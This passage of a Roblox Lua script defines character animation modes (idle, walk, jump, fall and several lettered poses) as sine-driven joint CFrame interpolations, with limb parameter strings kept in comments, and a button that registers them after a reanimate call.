			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.3962634015954636 + 0.12217304763960307 * sin((sine + 1.5) * 1) - Vfw * 0.2, -1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.9198621771937625 + 0.12217304763960307 * sin((sine + 1.5) * 1) - Vfw * 0.2, 1.2217304763960306 + 0.08726646259971647 * sin((sine + 0.2) * 0.5), -1.5707963267948966), deltaTime) 
			--LeftArm,-1,0,0,1,-175,-10,1.5,1,0.5,0,0,1,-90,5,0.6,1,0,0,0,1,-90,0,0,1,RightArm,1,0,0,1,180,-5,0,1,0.5,0,0,1,20,5,0.3,1,0,0,0,1,-110,5,1,1,Head,0,0,0,1,-75,-15,1.2,1,1,0,0,1,-0,5,0.2,0.5,0,0,0,1,-170,0,0,1,Torso,0,0,0,1,-5,10,1.2,1,5,-0.5,-0.2,1,-0,5,0,0.5,0,0.2,-1.2,1,180,0,0,1,LeftLeg,-1,0,0,1,80,7,1.5,1,-1,0,0,1,-70,5,0.2,0.5,0,0,0,1,90,0,0,1,RightLeg,1,0,0,1,110,7,1.5,1,-1,0,0,1,70,5,0.2,0.5,0,0,0,1,-90,0,0,1
		end
	})
	addmode("g", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9 + 0.4 * sin(sine * 8), 0.5, 0.5 * sin((sine + 0.25) * 4)) * angles(1.5707963267948966, -1.5707963267948966 + 1.0471975511965976 * sin(sine * 8), 1.5707963267948966 + 0.6981317007977318 * sin((sine + 0.25) * 4)), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0.3 * sin((sine + 0.4) * 8) + Crt * 3, 0, Cfw * -3) * angles(-1.5707963267948966 - Cfw, 0.3490658503988659 * sin(sine * 8) + Crt, -3.141592653589793), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.061086523819801536 * sin((sine + 0.125) * 16), -0.3839724354387525 * sin(sine * 8), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.4 * sin((sine - 0.01) * 8), 0) * angles(1.5707963267948966, 1.7453292519943295 + 0.6981317007977318 * sin(sine * 8), -1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.4 * sin((sine - 0.01) * 8), 0) * angles(1.5707963267948966, -1.7453292519943295 + 0.6981317007977318 * sin(sine * 8), 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9 + 0.4 * sin(sine * 8), 0.5, -0.5 * sin((sine - 0.35) * 4)) * angles(1.5707963267948966 + 0.6981317007977318 * sin(sine * 4), 1.5707963267948966 + 1.0471975511965976 * sin(sine * 8), -1.5707963267948966 + 0.17453292519943295 * sin((sine - 0.35) * 4)), deltaTime) 
			--LeftArm,-0.9,0.4,0,8,90,0,0.25,4,0.5,0,0,8,-90,60,0,8,0,0.5,0.25,4,90,40,0.25,4,Torso,0,0.3,0.4,8,-90,0,0,8,0,0,0,4,0,20,0,8,0,0,0,8,-180,0,0,8,Head,0,0,0,8,-90,3.5,0.125,16,1,0,0,8,0,-22,0,8,0,0,0,8,-180,0,0,1.1,RightLeg,1,0,0,8,90,0,0,8,-1,0.4,-0.01,8,100,40,0,8,0,0,0,8,-90,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.4,-0.01,8,-100,40,0,8,0,0,0,8,90,0,0,8,RightArm,0.9,0.4,0,8,90,40,0,4,0.5,0,0,8,90,60,0,8,0,-0.5,-0.35,4,-90,10,-0.35,4
		end
	})
	addmode("h", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, -0.4363323129985824 * sin(sine * 8), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.3 * sin(sine * 8), 0) * angles(1.5707963267948966, 1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), -1.5707963267948966), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5, 1, 0) * angles(-0.5235987755982988, -1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5, 1, 0) * angles(-0.5235987755982988, 1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(-0.1 * sin(sine * 8) + Crt * 3, 0.2 * sin((sine + 0.1) * 16), Cfw * -3) * angles(-1.5707963267948966 - Cfw, 0.2617993877991494 * sin(sine * 8) + Crt, -3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.3 * sin(sine * 8), 0) * angles(1.5707963267948966, -1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), 1.5707963267948966), deltaTime) 
			--Head,0,0,0,8,-90,0,0,8,1,0,0,8,0,-25,0,8,0,0,0,8,-180,0,0,8,RightLeg,1,0,0,8,90,0,0,8,-1,0.3,0,8,90,30,0,8,0,0,0,8,-90,0,0,8,LeftArm,-0.5,0,0,8,-30,0,0,8,1,0,0,8,-90,-30,0,8,0,0,0,8,180,0,0,8,RightArm,0.5,0,0,8,-30,0,0,8,1,0,0,16,90,-30,0,8,0,0,0,8,180,0,0,8,Torso,0,-0.1,0,8,-90,0,0,8,0,0.2,0.1,16,0,15,0,8,0,0,0,8,-180,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.3,0,8,-90,30,0,8,0,0,0,8,90,0,0,8,Fedora_Handle,8.657480066176504e-09,0,0,8,-6,0,0,8,-0.15052366256713867,0,0,8,0,0,0,8,-0.010221302509307861,0,0,8,0,0,0,8
		end
	})
	addmode("j", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			LeftHip.C0 = LeftHip.C0:Lerp(cf(-0.8, -1, -0.1) * angles(0.17453292519943295, -0.6981317007977318, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.2, 0.5, 0) * angles(-0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.1) * 4), 0, 0.6981317007977318 + 0.08726646259971647 * sin((sine + 0.1) * 4)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1.1, -1, 0) * angles(1.5707963267948966, 1.7453292519943295, -1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.1) * 4), 0, 2.792526803190927), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -1.7 + 0.5 * sin(sine * 4), 0.15 * sin(sine * 4) - Cfw * 3) * angles(3.3161255787892263 + 0.17453292519943295 * sin(sine * 4) - Cfw, Crt, 3.6651914291880923), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.8 + 0.4 * sin(sine * 4), 0.6 + 0.1 * sin(sine * 4), 0.4 - 0.25 * sin(sine * 4)) * angles(2.9670597283903604, 2.2689280275926285 - 0.17453292519943295 * sin(sine * 4), -1.4835298641951802 - 0.17453292519943295 * sin(sine * 4)), deltaTime) 
			--GalaxyBeautifulHair_Handle,-0.15000000596046448,0,0,1,0,0,0,1,0.10000000149011612,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,LeftLeg,-0.8,0,0,4,10,0,0,4,-1,0,0,4,-40,0,0,4,-0.1,0,0,4,0,0,0,4,LeftArm,-1.2,0,0,4,-20,5,0.1,4,0.5,0,0,4,0,0,0,4,0,0,0,4,40,5,0.1,4,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,ValkyrieHelm_Handle,8.658389560878277e-09,0,0,1,-15,0,0,1,-0.2433757781982422,0,0,1,0,0,0,1,-0.2657628059387207,0,0,1,0,0,0,1,RightLeg,1.1,0,0,4,90,0,0,4,-1,0,0,4,100,0,0,4,0,0,0,4,-90,0,0,4,BlackIronAntlers_Handle,8.658389560878277e-09,0,0,1,0,0,0,1,-0.6500000953674316,0,0,1,0,0,0,1,0.19972775876522064,0,0,1,0,0,0,1,DevAwardsAdurite_Handle,0,0,0,1,0,0,0,1,-0.25,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,SilverthornAntlers_Handle,8.658389560878277e-09,0,0,1,0,0,0,1,-0.6500000953674316,0,0,1,0,0,0,1,0.19972775876522064,0,0,1,0,0,0,1,Head,0,0,0,4,-90,5,0.1,4,1,0,0,4,-0,0,0,4,0,0,0,4,160,0,0,4,Torso,0,0,0,4,190,10,0,4,-1.70,0.5,0,4,-0,0,0,4,0,0.15,0,4,210,0,0,4,RightArm,0.8,0.4,0,4,170,0,0,4,0.6,0.1,0,4,130,-10,0,4,0.4,-0.25,0,4,-85,-10,0,4
		end
	})
	addmode("k", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 - 0.08726646259971647 * sin((sine + 0.3333333333333333) * 12), -0.08726646259971647 * sin((sine + 0.2) * 6), 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.5 - 0.5 * sin((sine + 0.39999999999999997) * 12), -0.5) * angles(1.7453292519943295 - 1.0471975511965976 * sin(sine * 6), -1.5707963267948966 + 0.1308996938995747 * sin(sine * 6), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.5 - 0.5 * sin((sine + 0.39999999999999997) * 12), -0.5) * angles(1.7453292519943295 + 1.0471975511965976 * sin(sine * 6), 1.5707963267948966 + 0.1308996938995747 * sin(sine * 6), -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -0.5 + 0.3 * sin((sine + 0.16666666666666666) * 12), Cfw * -3) * angles(-1.3962634015954636 + 0.08726646259971647 * sin((sine + 0.3333333333333333) * 12) - Cfw, 0.08726646259971647 * sin((sine + 0.06666666666666667) * 6) + Crt, 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.8 - 0.1 * sin(sine * 6), 0.5 + 0.1 * sin(sine * 6), -0.2) * angles(3.141592653589793 - 0.17453292519943295 * sin((sine + 0.39999999999999997) * 12), -0.17453292519943295, 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.8 - 0.1 * sin(sine * 6), 0.5 - 0.1 * sin(sine * 6), -0.2) * angles(3.141592653589793 - 0.17453292519943295 * sin((sine + 0.39999999999999997) * 12), 0.17453292519943295, -1.5707963267948966), deltaTime) 
			--GalaxyBeautifulHair_Handle,-0.15000000596046448,0,0,1.5,0,0,0,1.5,0.10000000149011612,0,0,1.5,0,0,0,1.5,0,0,0,1.5,0,0,0,1.5,Head,0,0,0,6,-95,-5,0.3333333333333333,12,1,0,0,6,-0,-5,0.2,6,0,0,0,6,180,0,0,6,ValkyrieHelm_Handle,8.658389560878277e-09,0,0,1.5,-15,0,0,1.5,-0.2433757781982422,0,0,1.5,0,0,0,1.5,-0.2657628059387207,0,0,1.5,0,0,0,1.5,SilverthornAntlers_Handle,8.658389560878277e-09,0,0,1.5,0,0,0,1.5,-0.6500000953674316,0,0,1.5,0,0,0,1.5,0.19972775876522064,0,0,1.5,0,0,0,1.5,BlackIronAntlers_Handle,8.658389560878277e-09,0,0,1.5,0,0,0,1.5,-0.6500000953674316,0,0,1.5,0,0,0,1.5,0.19972775876522064,0,0,1.5,0,0,0,1.5,Fedora_Handle,8.657480066176504e-09,0,0,1.5,-6,0,0,1.5,-0.15052366256713867,0,0,1.5,0,0,0,1.5,-0.010221302509307861,0,0,1.5,0,0,0,1.5,LeftLeg,-1,0,0,6,100,-60,0,6,-0.5,-0.5,0.39999999999999997,12,-90,7.5,0,6,-0.5,0,0,6,90,0,0,6,EyelessSmileHead_Handle,-0.00043487548828125,0,0,1.5,180,0,0,1.5,0.6000361442565918,0,0,1.5,0,0,0,1.5,0.0003204345703125,0,0,1.5,180,0,0,1.5,RightLeg,1,0,0,6,100,60,0,6,-0.5,-0.5,0.39999999999999997,12,90,7.5,0,6,-0.5,0,0,6,-90,0,0,6,DevAwardsAdurite_Handle,0,0,0,1.5,0,0,0,1.5,-0.25,0,0,1.5,0,0,0,1.5,0,0,0,1.5,0,0,0,1.5,Torso,0,0,0,6,-80,5,0.3333333333333333,12,-0.5,0.3,0.16666666666666666,12,-0,5,0.06666666666666667,6,0,0,0,6,180,0,0,6,LeftArm,-0.8,-0.1,0,6,180,-10,0.39999999999999997,12,0.5,0.1,0,6,-10,0,0,6,-0.2,0,0,6,90,0,0,6,RightArm,0.8,-0.1,0,6,180,-10,0.39999999999999997,12,0.5,-0.1,0,6,10,0,0,6,-0.2,0,0,6,-90,0,0,6
		end
	})
	addmode("l", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.04363323129985824 * sin((sine + 0.1) * 1), -0.17453292519943295 * sin((sine + 0.1) * 5), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.2 * sin(sine * 5), -0.2 + 0.2 * sin(sine * 5)) * angles(2.181661564992912 - 0.8726646259971648 * sin(sine * 5), 1.9198621771937625 - 0.3490658503988659 * sin(sine * 5), -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.7, 0.8, 0) * angles(1.0471975511965976 + 0.03490658503988659 * sin(sine * 10), 2.0943951023931953 + 0.10471975511965978 * sin((sine + 0.1) * 5), 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.2 * sin(sine * 5), -0.2 - 0.2 * sin(sine * 5)) * angles(2.181661564992912 + 0.8726646259971648 * sin(sine * 5), -1.9198621771937625 - 0.3490658503988659 * sin(sine * 5), 1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0.15 + 0.4 * sin((sine - 0.5) * 10), Cfw * -3) * angles(-1.4835298641951802 - Cfw, 0.17453292519943295 * sin(sine * 5) + Crt, -3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.7, 0.5, -0.3) * angles(1.7453292519943295, -0.8726646259971648, 1.5707963267948966), deltaTime) 
			--Head,0,0,0,5,-90,2.5,0.1,1,1,0,0,4,0,-10,0.1,5,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,125,-50,0,5,-1,0.2,0,5,110,-20,0,5,-0.2,0.2,0,5,-90,0,0,4,RightArm,0.7,0,0,4,60,2,0,10,0.8,0,0,4,120,6,0.1,5,0,0,0,4,90,0,0,4,LeftLeg,-1,0,0,4,125,50,0,5,-1,-0.2,0,5,-110,-20,0,5,-0.2,-0.2,0,5,90,0,0,4,Torso,0,0,0,4,-85,0,0,4,0.15,0.4,-0.5,10,0,10,0,5,0,0,0,4,-180,0,0,4,LeftArm,-0.7,0,0,4,100,0,0,4,0.5,0,0,4,-50,0,0,4,-0.3,0,0,4,90,0,0,4
		end
	})

	addmode("x", {
		idle = function()
			local Cfw, Crt = velchgbycfrvec()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, 0, 3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			--RightArm,1,0,0,1,0,0,0,1,0.5,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,Head,0,0,0,1,-90,0,0,1,1,0,0,1,-0,0,0,1,0,0,0,1,180,0,0,1,RightLeg,1,0,0,1,0,0,0,1,-1,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,LeftLeg,-1,0,0,1,-0,0,0,1,-1,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,Torso,0,0,0,1,-90,0,0,1,0,0,0,1,-0,0,0,1,0,0,0,1,180,0,0,1,LeftArm,-1,0,0,1,-0,0,0,1,0.5,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1
		end,
		walk = function()
			local Cfw, Crt = velchgbycfrvec()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, 0, 3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, 1.5707963267948966, 0), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.5707963267948966 - Cfw, Crt, 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(0, -1.5707963267948966, 0), deltaTime) 
			--RightArm,1,0,0,1,0,0,0,1,0.5,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,Head,0,0,0,1,-90,0,0,1,1,0,0,1,-0,0,0,1,0,0,0,1,180,0,0,1,RightLeg,1,0,0,1,0,0,0,1,-1,0,0,1,90,0,0,1,0,0,0,1,0,0,0,1,LeftLeg,-1,0,0,1,-0,0,0,1,-1,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1,Torso,0,0,0,1,-90,0,0,1,0,0,0,1,-0,0,0,1,0,0,0,1,180,0,0,1,LeftArm,-1,0,0,1,-0,0,0,1,0.5,0,0,1,-90,0,0,1,0,0,0,1,0,0,0,1
		end
	})
end)

btn("nameless animations V6", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local velbycfrvec=t.velbycfrvec
	local velchgbycfrvec=t.velchgbycfrvec
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.3 + 0.1 * sin(sine * 2), -0.1) * angles(-0.5235987755982988 + 0.05235987755982989 * sin((sine + 1.5) * 2), 1.0471975511965976 + 0.08726646259971647 * sin((sine + 0.5) * 2), 0.5235987755982988), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.6) * 2), 0, 3.141592653589793 + 0.2617993877991494 * sin((sine - 1.2) * 1)), deltaTime)
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.1 * sin(sine * 2), 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin(sine * 2), 0, 3.141592653589793), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 - 0.1 * sin(sine * 2) + rY, 0.1 * sin(sine * 2) - rY * 0.5) * angles(-0.6981317007977318 - 0.08726646259971647 * sin(sine * 2), 1.0471975511965976, 0.5235987755982988), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.6 + 0.1 * sin(sine * 2), 0) * angles(3.141592653589793 + 0.05235987755982989 * sin((sine + 0.5) * 2), -2.705260340591211 + 0.017453292519943295 * sin((sine + 1.5) * 2), -1.2217304763960306 + 0.05235987755982989 * sin((sine + 1.5) * 2)), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.1 * sin(sine * 2) + lY, 0.1 * sin(sine * 2) - lY * 0.5) * angles(-0.3490658503988659 - 0.08726646259971647 * sin(sine * 2), -1.0471975511965976, -0.5235987755982988), deltaTime)
			--RightArm,1,0,0,2,-30,3,1.5,2,0.3,0.1,0,2,60,5,0.5,2,-0.1,0,0,2,30,0,0,2,Head,0,0,0,2,-95,5,0.6,2,1,0,0,2,-0,0,0,1,0,0,0,2,180,15,-1.2,1,Torso,0,0,0,2,-90,5,0,2,0,0.1,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,RightLeg,1,0,0,2,-40,-5,0,2,-1,-0.1,0,2,60,0,0,2,0,0.1,0,2,30,0,0,2,Meshes/TrollFaceHeadAccessory_Handle,0.01043701171875,0,0,1,0,0,0,1,0.43610429763793945,0,0,1,0,0,0,1,-0.01102447509765625,0,0,1,0,0,0,1,LeftArm,-1,0,0,2,180,3,0.5,2,0.6,0.1,0,2,-155,1,1.5,2,0,0,0,2,-70,3,1.5,2,LeftLeg,-1,0,0,2,-20,-5,0,2,-1,-0.1,0,2,-60,0,0,2,0,0.1,0,2,-30,0,0,2
		end,
		walk = function()
			local fw, rt = velbycfrvec()

			local rY, lY = raycastlegs()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -0.2 + 0.2 * sin(sine * 16), 0) * angles(-1.6580627893946132 + 0.04363323129985824 * sin(sine * 16) - fw * 0.15, 0.03490658503988659 * sin(sine * 8) + rt * 0.15, -3.141592653589793 - 0.08726646259971647 * sin((sine + 0.25) * 8) - rt * 0.1), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.8 + 0.4 * sin((sine + 0.125) * 8) + rY, -0.15 * fw + 0.4 * sin((sine + 10) * 8) * fw + rY * -0.5) * angles(1.3962634015954636 + 0.6981317007977318 * sin(sine * 8)*fw, 1.5707963267948966 + 0.6981317007977318 * sin(sine * 8)*rt, -1.5707963267948966 + 0.2617993877991494 * sin(sine * 8)), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.35 - 0.1 * sin(sine * 8), 0) * angles(0.5235987755982988 * sin(sine * 8)*fw, -1.5707963267948966 - 0.5235987755982988 * sin(sine * 8)*fw, -0.5235987755982988 * sin(sine * 8)*fw), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.35 + 0.1 * sin(sine * 8), 0) * angles(-0.5235987755982988 * sin(sine * 8)*fw, 1.5707963267948966 - 0.5235987755982988 * sin(sine * 8)*fw, -0.5235987755982988 * sin(sine * 8)*fw), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.8 - 0.4 * sin((sine + 0.125) * 8) + lY, -0.15 * fw - 0.4 * sin((sine + 10) * 8) * fw + lY * -0.5) * angles(1.3962634015954636 - 0.6981317007977318 * sin(sine * 8)*fw, -1.5707963267948966 - 0.6981317007977318 * sin(sine * 8)*rt, 1.5707963267948966 + 0.2617993877991494 * sin(sine * 8)), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine + 10) * 16) + fw * 0.15, -0.08726646259971647 * sin(sine * 8) + rt * -0.1, 3.141592653589793 - 0.05235987755982989 * sin((sine + 5) * 8) - rt * 0.5), deltaTime)
			--Torso,0,0,0,8,-95,2.5,0,16,-0.2,0.2,0,16,0,5,0,8,0,0,0,8,-180,-5,0.25,8,RightArm,1,0,0,1,0,-30,0,8,0.35,0.1,0,8,90,-30,0,8,0,0,0,8,0,-30,0,8,RightLeg,1,0,0,8,80,40,0,8,-0.8,0.4,0.125,8,90,40,0,8,-0.15,0.4,10,8,-90,15,0,8,LeftLeg,-1,0,0,8,80,-40,0,8,-0.8,-0.4,0.125,8,-90,-40,0,8,-0.15,-0.4,10,8,90,15,0,8,Head,0,0,0,1,-90,2.5,10,16,1,0,0,1,-0,-5,0,8,0,0,0,1,180,-3,5,8,LeftArm,-1,0,0,1,0,30,0,8,0.35,-0.1,0,8,-90,-30,0,8,0,-0.4,0,8,0,-30,0,8
		end,
		jump = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.4835298641951802 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.6580627893946132 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})

	addmode("q", {
		idle = function()
